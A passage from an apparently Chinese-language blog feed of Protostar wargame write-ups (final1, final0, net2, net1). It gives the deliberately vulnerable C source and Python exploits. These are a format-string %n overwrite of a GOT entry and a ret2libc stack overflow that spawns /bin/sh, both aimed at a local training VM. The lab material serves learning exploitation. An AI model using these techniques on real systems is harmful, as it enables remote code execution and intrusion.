class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2994</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_until</span><span class="params">(check)</span>:</span></span><br><span class="line">        buffer = <span class="string">''</span></span><br><span class="line">        <span class="keyword">while</span> check <span class="keyword">not</span> <span class="keyword">in</span> buffer:</span><br><span class="line">                buffer += s.recv(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line">strncmp = struct.pack(<span class="string">"I"</span>, <span class="number">0x804a1a8</span>)</span><br><span class="line"></span><br><span class="line">ip, port = s.getsockname()</span><br><span class="line">hostname = ip + <span class="string">":"</span> + str(port)</span><br><span class="line">padding = <span class="string">"A"</span>*(<span class="number">24</span>-len(hostname))</span><br><span class="line"></span><br><span class="line">username = padding + <span class="string">"BBBB"</span> + <span class="string">"%08x "</span>*<span class="number">20</span></span><br><span class="line">login = <span class="string">"CCCC"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> read_until(<span class="string">"[final1] $ "</span>)</span><br><span class="line">s.send(<span class="string">'username '</span> + username + <span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> read_until(<span class="string">"[final1] $ "</span>)</span><br><span class="line">s.send(<span class="string">'login '</span> + login + <span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> read_until(<span class="string">"[final1] $ "</span>)</span><br><span class="line">raw_input(<span class="string">'wait here...'</span>)</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/final1_6.jpg" data-fancybox="group" data-caption="final1_6" class="fancybox"><img alt="final1_6" title="final1_6" data-src="https://dblu3.github.io/img/Protostar/final1_6.jpg" class="lazyload"></a></p><p>查看strncmp(0x804a1a8)上的数据<br><a href="https://dblu3.github.io/img/Protostar/final1_7.jpg" data-fancybox="group" data-caption="final1_7" class="fancybox"><img alt="final1_7" title="final1_7" data-src="https://dblu3.github.io/img/Protostar/final1_7.jpg" class="lazyload"></a></p><p>计算出偏移后完善exp</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2994</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_until</span><span class="params">(check)</span>:</span></span><br><span class="line">        buffer = <span class="string">''</span></span><br><span class="line">        <span class="keyword">while</span> check <span class="keyword">not</span> <span class="keyword">in</span> buffer:</span><br><span class="line">                buffer += s.recv(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line">strncmp = struct.pack(<span class="string">"I"</span>, <span class="number">0x804a1a8</span>)</span><br><span class="line">ip, port = s.getsockname()</span><br><span class="line">hostname = ip + <span class="string">":"</span> + str(port)</span><br><span class="line">padding = <span class="string">"A"</span>*(<span class="number">24</span>-len(hostname))</span><br><span class="line"></span><br><span class="line">username = padding + <span class="string">"BBBB"</span> + strncmp + <span class="string">"%17$65407x "</span> + <span class="string">"%18$08n  "</span> </span><br><span class="line">+ struct.pack(<span class="string">"I"</span>, <span class="number">0x804a1a8</span>+<span class="number">2</span>) + <span class="string">"%17$47157x "</span> + <span class="string">"%24$08n"</span></span><br><span class="line"></span><br><span class="line">login = <span class="string">"CCCC"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> read_until(<span class="string">"[final1] $ "</span>)</span><br><span class="line">s.send(<span class="string">'username '</span> + username + <span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> read_until(<span class="string">"[final1] $ "</span>)</span><br><span class="line">s.send(<span class="string">'login '</span> + login + <span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> read_until(<span class="string">"[final1] $ "</span>)</span><br><span class="line"><span class="comment"># raw_input('wait here...')</span></span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/final1_8.jpg" data-fancybox="group" data-caption="final1_8" class="fancybox"><img alt="final1_8" title="final1_8" data-src="https://dblu3.github.io/img/Protostar/final1_8.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Final1&quot;&gt;&lt;a href=&quot;#Final1&quot; class=&quot;headerlink&quot; title=&quot;Final1&quot;&gt;&lt;/a&gt;Final1&lt;/h1&gt;&lt;p&gt;Final1: remote blind format string&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_final0</title>
    <link href="http://yoursite.com/2018/09/22/Protostar-final0/"/>
    <id>http://yoursite.com/2018/09/22/Protostar-final0/</id>
    <published>2018-09-22T08:28:58.000Z</published>
    <updated>2018-09-22T13:09:15.052Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Final0"><a href="#Final0" class="headerlink" title="Final0"></a>Final0</h1><p>Final0: combines a stack overflow and network programming for a remote overflow</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Final0</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"final0"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2995</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Read the username in from the network</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">get_username</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">512</span>];</span><br><span class="line">  <span class="keyword">char</span> *q;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(<span class="built_in">buffer</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>));</span><br><span class="line">  gets(<span class="built_in">buffer</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Strip off trailing new line characters */</span></span><br><span class="line">  q = <span class="built_in">strchr</span>(<span class="built_in">buffer</span>, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line">  q = <span class="built_in">strchr</span>(<span class="built_in">buffer</span>, <span class="string">'\r'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Convert to lower case */</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">buffer</span>); i++) &#123;</span><br><span class="line">      <span class="built_in">buffer</span>[i] = <span class="built_in">toupper</span>(<span class="built_in">buffer</span>[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Duplicate the string and return it */</span></span><br><span class="line">  <span class="keyword">return</span> strdup(<span class="built_in">buffer</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  username = get_username();</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No such user %s\n"</span>, username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Hints"><a href="#Hints" class="headerlink" title="Hints"></a>Hints</h2><ul><li>depending on where you are returning to, you may wish to use a toupper() proof shellcode.</li><li>Core files will be in /tmp</li></ul><h2 id="Padding"><a href="#Padding" class="headerlink" title="Padding"></a>Padding</h2><p><a href="https://dblu3.github.io/img/Protostar/final0_1.jpg" data-fancybox="group" data-caption="final0_1" class="fancybox"><img alt="final0_1" title="final0_1" data-src="https://dblu3.github.io/img/Protostar/final0_1.jpg" class="lazyload"></a><br>计算出偏移是532</p><p>验证一下<br><a href="https://dblu3.github.io/img/Protostar/final0_2.jpg" data-fancybox="group" data-caption="final_2" class="fancybox"><img alt="final_2" title="final_2" data-src="https://dblu3.github.io/img/Protostar/final0_2.jpg" class="lazyload"></a></p><h2 id="Execve"><a href="#Execve" class="headerlink" title="Execve"></a>Execve</h2><p>找到<code>execve()</code>的地址<br><a href="https://dblu3.github.io/img/Protostar/final0_3.jpg" data-fancybox="group" data-caption="final0_3" class="fancybox"><img alt="final0_3" title="final0_3" data-src="https://dblu3.github.io/img/Protostar/final0_3.jpg" class="lazyload"></a></p><h2 id="Base-of-libc"><a href="#Base-of-libc" class="headerlink" title="Base of libc"></a>Base of libc</h2><p><a href="https://dblu3.github.io/img/Protostar/final0_4.jpg" data-fancybox="group" data-caption="final0_4" class="fancybox"><img alt="final0_4" title="final0_4" data-src="https://dblu3.github.io/img/Protostar/final0_4.jpg" class="lazyload"></a></p><h2 id="Offset-of-bin-sh"><a href="#Offset-of-bin-sh" class="headerlink" title="Offset of /bin/sh"></a>Offset of /bin/sh</h2><p>找到<code>/bin/sh</code>的偏移量<br><a href="https://dblu3.github.io/img/Protostar/final0_5.jpg" data-fancybox="group" data-caption="final0_5" class="fancybox"><img alt="final0_5" title="final0_5" data-src="https://dblu3.github.io/img/Protostar/final0_5.jpg" class="lazyload"></a></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2995</span>))</span><br><span class="line"></span><br><span class="line">padding = <span class="string">"a"</span>*<span class="number">532</span></span><br><span class="line">libc_base = <span class="number">0xb7e97000</span></span><br><span class="line">offset_bin_sh = <span class="number">1176511</span></span><br><span class="line">execve = <span class="number">0x08048c0c</span></span><br><span class="line"></span><br><span class="line">exp = padding</span><br><span class="line">exp += struct.pack(<span class="string">"I"</span>, execve)</span><br><span class="line">exp += <span class="string">"AAAA"</span> <span class="comment"># junk</span></span><br><span class="line">exp += struct.pack(<span class="string">"I"</span>, libc_base + offset_bin_sh)</span><br><span class="line">exp += <span class="string">"\x00"</span>*<span class="number">8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] EXP: "</span></span><br><span class="line"><span class="keyword">print</span> exp</span><br><span class="line"></span><br><span class="line">s.send(exp + <span class="string">"\n"</span>)</span><br><span class="line">s.send(<span class="string">"id \n"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Recv: "</span></span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/final0_6.jpg" data-fancybox="group" data-caption="final0_6" class="fancybox"><img alt="final0_6" title="final0_6" data-src="https://dblu3.github.io/img/Protostar/final0_6.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Final0&quot;&gt;&lt;a href=&quot;#Final0&quot; class=&quot;headerlink&quot; title=&quot;Final0&quot;&gt;&lt;/a&gt;Final0&lt;/h1&gt;&lt;p&gt;Final0: combines a stack overflow and network programming for a remote overflow&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_net2</title>
    <link href="http://yoursite.com/2018/09/18/Protostar-net2/"/>
    <id>http://yoursite.com/2018/09/18/Protostar-net2/</id>
    <published>2018-09-18T08:34:20.000Z</published>
    <updated>2018-09-18T08:53:29.350Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Net2"><a href="#Net2" class="headerlink" title="Net2"></a>Net2</h1><p>Net2: add up 4 unsigned 32-bit integers<br>跟net1相差不大，不多废话</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Net2</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"net2"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 997</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 997</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2997</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> quad[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result, wanted;</span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">      quad[i] = <span class="built_in">random</span>();</span><br><span class="line">      result += quad[i];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">write</span>(<span class="number">0</span>, &amp;(quad[i]), <span class="keyword">sizeof</span>(result)) != <span class="keyword">sizeof</span>(result)) &#123;</span><br><span class="line">          errx(<span class="number">1</span>, <span class="string">":(\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">read</span>(<span class="number">0</span>, &amp;wanted, <span class="keyword">sizeof</span>(result)) != <span class="keyword">sizeof</span>(result)) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">":&lt;\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(result == wanted) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you added them correctly\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"sorry, try again. invalid\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don't do this :&gt; */</span></span><br><span class="line">  srandom(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">run</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h2><ul><li>Keep in mind that it wraps</li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">2997</span>))</span><br><span class="line"></span><br><span class="line">n = s.recv(<span class="number">4</span>)</span><br><span class="line">n += s.recv(<span class="number">4</span>)</span><br><span class="line">n += s.recv(<span class="number">4</span>)</span><br><span class="line">n += s.recv(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] n: "</span> + n</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] repr(n): "</span> + repr(n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Hex: "</span> + n.encode(<span class="string">'hex'</span>)</span><br><span class="line">N = struct.unpack(<span class="string">"IIII"</span>,n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] N: "</span></span><br><span class="line"><span class="keyword">print</span> N</span><br><span class="line">sumofN = sum(N)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] sum: "</span></span><br><span class="line"><span class="keyword">print</span> sumofN</span><br><span class="line">s.send(struct.pack(<span class="string">"I"</span>, sumofN))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Recv: "</span> + s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/net2_1.jpg" data-fancybox="group" data-caption="net2_1" class="fancybox"><img alt="net2_1" title="net2_1" data-src="https://dblu3.github.io/img/Protostar/net2_1.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Net2&quot;&gt;&lt;a href=&quot;#Net2&quot; class=&quot;headerlink&quot; title=&quot;Net2&quot;&gt;&lt;/a&gt;Net2&lt;/h1&gt;&lt;p&gt;Net2: add up 4 unsigned 32-bit integers&lt;br&gt;跟net1相差不大，不多废话&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_net1</title>
    <link href="http://yoursite.com/2018/09/18/Protostar-net1/"/>
    <id>http://yoursite.com/2018/09/18/Protostar-net1/</id>
    <published>2018-09-18T07:58:34.000Z</published>
    <updated>2018-09-18T08:51:55.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Net1"><a href="#Net1" class="headerlink" title="Net1"></a>Net1</h1><p>Net1: convert binary integers into ascii<br>跟net0没太大差别，直接写个脚本就行了</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Net1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"net1"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 998</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 998</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2998</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">12</span>];</span><br><span class="line">  <span class="keyword">char</span> fub[<span class="number">12</span>];</span><br><span class="line">  <span class="keyword">char</span> *q;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> wanted;</span><br><span class="line"></span><br><span class="line">  wanted = <span class="built_in">random</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(fub, <span class="string">"%d"</span>, wanted);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">write</span>(<span class="number">0</span>, &amp;wanted, <span class="keyword">sizeof</span>(wanted)) != <span class="keyword">sizeof</span>(wanted)) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">":(\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fgets(buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">":(\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  q = <span class="built_in">strchr</span>(buf, <span class="string">'\r'</span>); <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line">  q = <span class="built_in">strchr</span>(buf, <span class="string">'\n'</span>); <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strcmp</span>(fub, buf) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you correctly sent the data\n"</span>);</span><br><span class="line">  